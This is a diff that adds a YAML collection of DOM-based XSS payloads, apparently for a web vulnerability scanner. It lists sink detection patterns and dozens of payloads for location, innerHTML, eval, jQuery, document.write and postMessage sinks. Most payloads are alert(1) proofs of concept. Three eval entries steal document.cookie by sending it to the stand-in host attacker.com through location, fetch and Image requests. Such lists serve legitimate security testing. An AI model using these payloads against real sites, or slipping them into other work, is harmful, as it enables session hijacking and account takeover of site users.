@@ -1,0 +1,312 @@
+metadata:
+  type: xss/dom
+  version: "1.0"
+  description: "DOM-based XSS payloads targeting client-side sinks"
+  sources: ["OWASP", "PortSwigger", "PayloadsAllTheThings"]
+
+detection_patterns:
+  - "document\\.location"
+  - "document\\.URL"
+  - "document\\.referrer"
+  - "innerHTML"
+  - "outerHTML"
+  - "eval\\s*\\("
+  - "setTimeout\\s*\\("
+  - "setInterval\\s*\\("
+
+payloads:
+  location_sinks:
+    - value: "#<script>alert(1)</script>"
+      description: "Hash fragment script injection"
+      severity: high
+      tags: [dom, hash, script]
+
+    - value: "#<img src=x onerror=alert(1)>"
+      description: "Hash fragment img injection"
+      severity: high
+      tags: [dom, hash, img]
+
+    - value: "#'-alert(1)-'"
+      description: "Hash fragment expression"
+      severity: high
+      tags: [dom, hash, expression]
+
+    - value: "?param=<script>alert(1)</script>"
+      description: "Query param script injection"
+      severity: high
+      tags: [dom, query, script]
+
+    - value: "?param=<img src=x onerror=alert(1)>"
+      description: "Query param img injection"
+      severity: high
+      tags: [dom, query, img]
+
+    - value: "?param=javascript:alert(1)"
+      description: "Query param javascript URI"
+      severity: high
+      tags: [dom, query, javascript_uri]
+
+    - value: "?param='-alert(1)-'"
+      description: "Query param expression"
+      severity: high
+      tags: [dom, query, expression]
+
+    - value: "?param=\";alert(1);//"
+      description: "Query param semicolon"
+      severity: high
+      tags: [dom, query, expression]
+
+    - value: "?param=data:text/html,<script>alert(1)</script>"
+      description: "Query param data URI"
+      severity: high
+      tags: [dom, query, data_uri]
+
+    - value: "?redirect=javascript:alert(1)"
+      description: "Redirect javascript URI"
+      severity: high
+      tags: [dom, redirect, javascript_uri]
+
+    - value: "?url=javascript:alert(1)"
+      description: "URL param javascript"
+      severity: high
+      tags: [dom, url, javascript_uri]
+
+    - value: "?next=javascript:alert(1)"
+      description: "Next param javascript"
+      severity: high
+      tags: [dom, next, javascript_uri]
+
+    - value: "?return=javascript:alert(1)"
+      description: "Return param javascript"
+      severity: high
+      tags: [dom, return, javascript_uri]
+
+    - value: "?callback=alert(1)"
+      description: "Callback param injection"
+      severity: high
+      tags: [dom, callback]
+
+    - value: "?jsonp=alert(1)"
+      description: "JSONP callback injection"
+      severity: high
+      tags: [dom, jsonp]
+
+  innerHTML_sinks:
+    - value: "<img src=x onerror=alert(1)>"
+      description: "innerHTML img injection"
+      severity: high
+      tags: [dom, innerHTML, img]
+
+    - value: "<svg onload=alert(1)>"
+      description: "innerHTML svg injection"
+      severity: high
+      tags: [dom, innerHTML, svg]
+
+    - value: "<details open ontoggle=alert(1)>"
+      description: "innerHTML details"
+      severity: high
+      tags: [dom, innerHTML, details]
+
+    - value: "<body onload=alert(1)>"
+      description: "innerHTML body"
+      severity: high
+      tags: [dom, innerHTML, body]
+
+    - value: "<iframe onload=alert(1)>"
+      description: "innerHTML iframe"
+      severity: high
+      tags: [dom, innerHTML, iframe]
+
+    - value: "<video onerror=alert(1)><source>"
+      description: "innerHTML video"
+      severity: high
+      tags: [dom, innerHTML, video]
+
+    - value: "<object data=javascript:alert(1)>"
+      description: "innerHTML object"
+      severity: high
+      tags: [dom, innerHTML, object]
+
+    - value: "<embed src=javascript:alert(1)>"
+      description: "innerHTML embed"
+      severity: high
+      tags: [dom, innerHTML, embed]
+
+    - value: "<a href=javascript:alert(1)>click</a>"
+      description: "innerHTML anchor"
+      severity: high
+      tags: [dom, innerHTML, anchor]
+
+    - value: "<div onmouseover=alert(1)>hover</div>"
+      description: "innerHTML div hover"
+      severity: high
+      tags: [dom, innerHTML, div]
+
+  eval_sinks:
+    - value: "alert(1)"
+      description: "Direct eval injection"
+      severity: high
+      tags: [dom, eval]
+
+    - value: "alert(document.cookie)"
+      description: "Eval cookie theft"
+      severity: high
+      tags: [dom, eval, cookie]
+
+    - value: "document.location='http://attacker.com/?c='+document.cookie"
+      description: "Eval redirect exfil"
+      severity: high
+      tags: [dom, eval, exfiltration]
+
+    - value: "fetch('http://attacker.com/?c='+document.cookie)"
+      description: "Eval fetch exfil"
+      severity: high
+      tags: [dom, eval, exfiltration]
+
+    - value: "new Image().src='http://attacker.com/?c='+document.cookie"
+      description: "Eval image exfil"
+      severity: high
+      tags: [dom, eval, exfiltration]
+
+    - value: "window.location='javascript:alert(1)'"
+      description: "Eval window redirect"
+      severity: high
+      tags: [dom, eval, redirect]
+
+    - value: "eval('alert(1)')"
+      description: "Nested eval"
+      severity: high
+      tags: [dom, eval]
+
+    - value: "Function('alert(1)')()"
+      description: "Function constructor"
+      severity: high
+      tags: [dom, eval, function]
+
+    - value: "setInterval('alert(1)',0)"
+      description: "setInterval injection"
+      severity: high
+      tags: [dom, setInterval]
+
+    - value: "setTimeout('alert(1)',0)"
+      description: "setTimeout injection"
+      severity: high
+      tags: [dom, setTimeout]
+
+  jQuery_sinks:
+    - value: "<img src=x onerror=alert(1)>"
+      description: "jQuery html() sink"
+      severity: high
+      tags: [dom, jquery, html]
+
+    - value: "<script>alert(1)</script>"
+      description: "jQuery append() sink"
+      severity: high
+      tags: [dom, jquery, append]
+
+    - value: "<img src=x onerror=alert(1)>"
+      description: "jQuery after() sink"
+      severity: high
+      tags: [dom, jquery, after]
+
+    - value: "<img src=x onerror=alert(1)>"
+      description: "jQuery before() sink"
+      severity: high
+      tags: [dom, jquery, before]
+
+    - value: "<img src=x onerror=alert(1)>"
+      description: "jQuery prepend() sink"
+      severity: high
+      tags: [dom, jquery, prepend]
+
+    - value: "<img src=x onerror=alert(1)>"
+      description: "jQuery replaceWith() sink"
+      severity: high
+      tags: [dom, jquery, replaceWith]
+
+    - value: "javascript:alert(1)"
+      description: "jQuery attr() href sink"
+      severity: high
+      tags: [dom, jquery, attr]
+
+    - value: "javascript:alert(1)"
+      description: "jQuery attr() src sink"
+      severity: high
+      tags: [dom, jquery, attr]
+
+    - value: "http://attacker.com/"
+      description: "jQuery $.get() URL sink"
+      severity: high
+      tags: [dom, jquery, get]
+
+    - value: "http://attacker.com/"
+      description: "jQuery $.post() URL sink"
+      severity: high
+      tags: [dom, jquery, post]
+
+    - value: "http://attacker.com/"
+      description: "jQuery $.ajax() URL sink"
+      severity: high
+      tags: [dom, jquery, ajax]
+
+    - value: "javascript:alert(1)"
+      description: "jQuery $() selector sink"
+      severity: high
+      tags: [dom, jquery, selector]
+
+  document_write:
+    - value: "<script>alert(1)</script>"
+      description: "document.write script"
+      severity: high
+      tags: [dom, document_write, script]
+
+    - value: "<img src=x onerror=alert(1)>"
+      description: "document.write img"
+      severity: high
+      tags: [dom, document_write, img]
+
+    - value: "<svg onload=alert(1)>"
+      description: "document.write svg"
+      severity: high
+      tags: [dom, document_write, svg]
+
+    - value: "'><script>alert(1)</script>"
+      description: "document.write breakout"
+      severity: high
+      tags: [dom, document_write, breakout]
+
+    - value: "\"><script>alert(1)</script>"
+      description: "document.write double quote breakout"
+      severity: high
+      tags: [dom, document_write, breakout]
+
+  postMessage:
+    - value: "{\"type\":\"xss\",\"payload\":\"<script>alert(1)</script>\"}"
+      description: "postMessage JSON script"
+      severity: high
+      tags: [dom, postMessage, json]
+
+    - value: "{\"action\":\"redirect\",\"url\":\"javascript:alert(1)\"}"
+      description: "postMessage redirect"
+      severity: high
+      tags: [dom, postMessage, redirect]
+
+    - value: "<script>alert(1)</script>"
+      description: "postMessage raw script"
+      severity: high
+      tags: [dom, postMessage, script]
+
+    - value: "javascript:alert(1)"
+      description: "postMessage javascript URI"
+      severity: high
+      tags: [dom, postMessage, javascript_uri]
+
+    - value: "data:text/html,<script>alert(1)</script>"
+      description: "postMessage data URI"
+      severity: high
+      tags: [dom, postMessage, data_uri]
+
+    - value: "http://attacker.com/"
+      description: "postMessage external URL"
+      severity: high
+      tags: [dom, postMessage, external]
